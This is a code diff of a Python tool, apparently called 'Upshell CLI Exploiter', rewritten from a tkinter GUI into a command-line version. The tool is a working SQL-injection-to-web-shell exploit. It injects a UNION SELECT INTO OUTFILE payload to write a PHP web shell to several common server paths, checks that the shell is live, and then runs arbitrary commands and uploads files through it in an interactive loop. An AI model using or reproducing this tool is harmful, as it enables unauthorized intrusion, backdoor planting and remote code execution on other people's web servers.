@@ -1,13 +1,16 @@
-"""
-Upshell GUI Exploiter
-Author: JayVillain
-"""
+# Upshell CLI Exploiter
+# Author: JayVillain
 
-import tkinter as tk
-from tkinter import ttk, filedialog, scrolledtext, messagebox
 import requests
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+import argparse
+import os
 import time
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from rich.console import Console
+from rich.prompt import Prompt
+from rich.table import Table
+from rich.panel import Panel
+from rich import box
 
 # ---------------- CONFIG ---------------- #
 WEB_SHELL = '''<?php
@@ -21,16 +24,19 @@ if(isset($_FILES['file'])){
     echo "File uploaded.";
 }
 ?>'''
+
 UPLOAD_PATHS = [
     "/var/www/html/shell.php",
     "/tmp/shell.php",
     "/srv/http/shell.php",
     "C:/xampp/htdocs/shell.php",
 ]
-HEADERS = {"User-Agent": "Mozilla/5.0 (UpshellGUI)"}
-RETRY_DELAY = 1  # seconds
 
-# ---------------- UTILITY ---------------- #
+HEADERS = {"User-Agent": "Mozilla/5.0 (UpshellCLI)"}
+RETRY_DELAY = 1  # seconds
+console = Console()
+
+# ---------------- CORE FUNCTIONS ---------------- #
 def build_exploit_url(base_url: str, param: str, payload: str) -> str:
     parsed = urlparse(base_url)
     query = parse_qs(parsed.query)
@@ -38,123 +44,75 @@ def build_exploit_url(base_url: str, param: str, payload: str) -> str:
     new_query = urlencode(query, doseq=True)
     return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))
 
-# ---------------- CORE LOGIC ---------------- #
-class UpshellExploit:
-    def __init__(self, target_url: str):
-        self.target_url = target_url
-        self.param = self._extract_param()
+def extract_param(url: str) -> str:
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query)
+    if not qs:
+        raise ValueError("Target URL must contain at least one parameter")
+    return list(qs.keys())[0]
 
-    def _extract_param(self) -> str:
-        parsed = urlparse(self.target_url)
-        qs = parse_qs(parsed.query)
-        if not qs:
-            raise ValueError("Target URL must contain a GET parameter")
-        return list(qs.keys())[0]
-
-    def upload_shell(self) -> str:
-        for path in UPLOAD_PATHS:
-            payload = f"' UNION SELECT \"{WEB_SHELL}\" INTO OUTFILE '{path}'-- -"
-            exploit_url = build_exploit_url(self.target_url, self.param, payload)
-            try:
-                requests.get(exploit_url, headers=HEADERS, timeout=10)
-                shell_url = f"{urlparse(self.target_url).scheme}://{urlparse(self.target_url).netloc}{path}"
-                time.sleep(RETRY_DELAY)
-                check = requests.get(shell_url, headers=HEADERS, timeout=5)
-                if check.status_code == 200 and "cmd" in check.text:
-                    return shell_url
-            except requests.RequestException:
-                continue
-        return ''
-
-    def exec_cmd(self, shell_url: str, cmd: str) -> str:
+def try_upload_shell(url: str, param: str) -> str:
+    for path in UPLOAD_PATHS:
+        payload = f"' UNION SELECT \"{WEB_SHELL}\" INTO OUTFILE '{path}'-- -"
+        exploit_url = build_exploit_url(url, param, payload)
         try:
-            response = requests.get(shell_url, params={"cmd": cmd}, headers=HEADERS, timeout=10)
-            return response.text
-        except requests.RequestException as e:
-            return f"Error executing command: {e}"
+            console.print(f"[yellow][!] Trying to upload shell to:[/] {path}")
+            requests.get(exploit_url, headers=HEADERS, timeout=10)
+            shell_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}{path}"
+            time.sleep(RETRY_DELAY)
+            check = requests.get(shell_url, headers=HEADERS, timeout=5)
+            if check.status_code == 200 and "cmd" in check.text:
+                console.print(f"[green][+] Shell active at:[/] {shell_url}")
+                return shell_url
+        except Exception:
+            continue
+    return ''
 
-    def upload_file(self, shell_url: str, filepath: str) -> str:
-        try:
-            with open(filepath, 'rb') as f:
-                files = {'file': (filepath.split('/')[-1], f)}
-                response = requests.post(shell_url, files=files, headers=HEADERS, timeout=10)
-            return response.text
-        except Exception as e:
-            return f"Error uploading file: {e}"
+def exec_cmd(shell_url: str, cmd: str) -> str:
+    try:
+        response = requests.get(shell_url, params={"cmd": cmd}, headers=HEADERS, timeout=10)
+        return response.text
+    except requests.RequestException as e:
+        return f"[!] Error executing command: {e}"
 
-# ---------------- GUI ---------------- #
-class UpshellGUI(tk.Tk):
-    def __init__(self):
-        super().__init__()
-        self.title("Upshell GUI Exploiter")
-        self.geometry("700x500")
-        self.resizable(False, False)
-        self._build_widgets()
-        self.exploit = None
-        self.shell_url = ''
+def upload_file(shell_url: str, file_path: str) -> str:
+    try:
+        with open(file_path, 'rb') as f:
+            files = {'file': (os.path.basename(file_path), f)}
+            response = requests.post(shell_url, files=files, headers=HEADERS, timeout=10)
+        return response.text
+    except Exception as e:
+        return f"[!] File upload failed: {e}"
 
-    def _build_widgets(self):
-        # URL input frame
-        url_frame = ttk.LabelFrame(self, text="Target URL")
-        url_frame.pack(fill='x', padx=10, pady=5)
-        self.url_entry = ttk.Entry(url_frame)
-        self.url_entry.pack(fill='x', padx=5, pady=5)
-        ttk.Button(url_frame, text="Upload Shell", command=self._on_upload).pack(side='right', padx=5, pady=5)
+def shell_loop(shell_url: str):
+    console.print(Panel("[bold green]Shell active![/bold green] Enter [cyan]cmd[/cyan] or type [red]upload <path>[/red]. Type [yellow]exit[/yellow] to quit.", title="[bold]UpshellCLI[/bold]", box=box.ROUNDED))
+    while True:
+        cmd = Prompt.ask("[bold cyan]shell[/bold cyan]")
+        if cmd.lower() == 'exit':
+            break
+        elif cmd.startswith("upload "):
+            file_path = cmd.split(" ", 1)[1]
+            result = upload_file(shell_url, file_path)
+            console.print(result)
+        else:
+            output = exec_cmd(shell_url, cmd)
+            console.print(output)
 
-        # Log output
-        self.log = scrolledtext.ScrolledText(self, wrap='word', state='disabled')
-        self.log.pack(fill='both', expand=True, padx=10, pady=5)
+def main():
+    parser = argparse.ArgumentParser(description="Upshell CLI - SQLi to Shell Exploiter by JayVillain")
+    parser.add_argument("-u", "--url", help="Target URL with vulnerable parameter", required=True)
+    args = parser.parse_args()
 
-        # Command frame
-        cmd_frame = ttk.LabelFrame(self, text="Shell Interaction")
-        cmd_frame.pack(fill='x', padx=10, pady=5)
-        self.cmd_entry = ttk.Entry(cmd_frame)
-        self.cmd_entry.pack(side='left', fill='x', expand=True, padx=5, pady=5)
-        ttk.Button(cmd_frame, text="Execute", command=self._on_exec).pack(side='left', padx=5)
-        ttk.Button(cmd_frame, text="Upload File", command=self._on_file_upload).pack(side='left', padx=5)
-
-    def _log(self, message: str):
-        self.log.config(state='normal')
-        self.log.insert('end', message + '\n')
-        self.log.config(state='disabled')
-        self.log.see('end')
-
-    def _on_upload(self):
-        url = self.url_entry.get().strip()
-        if not url:
-            messagebox.showwarning("Input Error", "Please enter a target URL.")
-            return
-        try:
-            self.exploit = UpshellExploit(url)
-            self._log(f"[*] Attempting to upload shell to {url}")
-            shell = self.exploit.upload_shell()
-            if shell:
-                self.shell_url = shell
-                self._log(f"[+] Shell active at: {shell}")
-            else:
-                self._log("[-] Failed to upload shell.")
-        except ValueError as ve:
-            messagebox.showerror("URL Error", str(ve))
-
-    def _on_exec(self):
-        cmd = self.cmd_entry.get().strip()
-        if not cmd or not self.shell_url:
-            return
-        self._log(f"$ {cmd}")
-        output = self.exploit.exec_cmd(self.shell_url, cmd)
-        self._log(output)
-
-    def _on_file_upload(self):
-        if not self.shell_url:
-            return
-        filepath = filedialog.askopenfilename(title="Select file to upload")
-        if not filepath:
-            return
-        self._log(f"[*] Uploading file: {filepath}")
-        result = self.exploit.upload_file(self.shell_url, filepath)
-        self._log(result)
+    try:
+        param = extract_param(args.url)
+        console.print(Panel(f"[bold]Target:[/] {args.url}\n[bold]Param:[/] {param}", title="[blue]UpshellCLI Info[/blue]", box=box.DOUBLE))
+        shell_url = try_upload_shell(args.url, param)
+        if shell_url:
+            shell_loop(shell_url)
+        else:
+            console.print("[red][-] Upload shell failed on all paths.")
+    except Exception as e:
+        console.print(f"[red][!] Error:[/] {e}")
 
 if __name__ == '__main__':
-    app = UpshellGUI()
-    app.mainloop()
-# -*- coding: utf-8 -*-
+    main()
